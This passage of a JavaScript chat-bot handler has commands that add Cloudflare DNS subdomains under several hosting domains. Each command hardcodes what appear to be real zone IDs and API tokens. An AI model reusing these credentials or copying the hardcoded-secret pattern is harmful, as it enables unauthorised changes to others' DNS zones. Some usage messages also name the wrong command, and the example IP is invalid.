                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain3 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain3': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "edf8e5a66859e6a1f8ccbde07c415082";
               let apitoken = "p0gm6UzsPw0Y0eudhfDr1ZBvV_WjX9eMpTp4ksXZ";
               let tld = "didindev.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain4': {
           
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "fjYUs5uWqoZBU-4fCfqiqXHXhdRRrr2Lc2GZ0dOj";
               let tld = "sellerpannel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain5 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
break

 case 'domain5': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain6': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain7': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain8': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain9': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4dab40fe5183e4c6bd7b9fd87582803c";
               let apitoken = "95QUM8iFtLPZA-CgZplgvg19LhY-_QwxYdFNdotp";
               let tld = "mypanel.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain10': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fbb7300781a84b11d6db8767d59c";
               let apitoken = "jS5iwULl-Yr5H7miIYWhWVkF-4j5p1RzjwjyN";
               let tld = "panellku.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`
 Ip = ${e['ip']}

 Username = ${e['name']}

 crate by = ${author}
`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain11': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "DiansHost.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain12': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "92fffa5f2cce4005a30e3950620cb97d";
               let apitoken = "DXKGBd9zzFMsQjCirVRqO8nwE06imW8KyGpOqnwC";
               let tld = "DiansHost.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
        
        break
           case 'domain13': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e03420325af30aaed049cbcc4c3381ed";
               let apitoken = "SoEzG_hcx8trsYCG-YoxD3U3Tw6eKTbUxDZnokLn";
               let tld = "DiansHost.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain14': {
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba86d80050aa5a2343a8e456c85c32f0";
               let apitoken = "vvAcoh_BQOZ1u-jb7ORkH1YZDXOEoiA7dBovCcCs";
               let tld = "kangpannel.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           
           break
           case 'domain15': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "bc676ed94040800b77b4ede30822138c";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.art";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain16': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "57d742aa0cc2d83f18015d2c5d38dffa";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "akmalmodz.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain17': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "90a464fad4c50ce3c049d0a95d738c31";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.cfd";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain18': {
 
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "cd5058829fcb3ac96d3e5b094a5e1577";
               let apitoken = "yXX-1vM1JaJXgEiBuozDvEJxUtuSu-VEhoN0h7Kt";
               let tld = "DiansHost.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("PENGGUNAAN .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
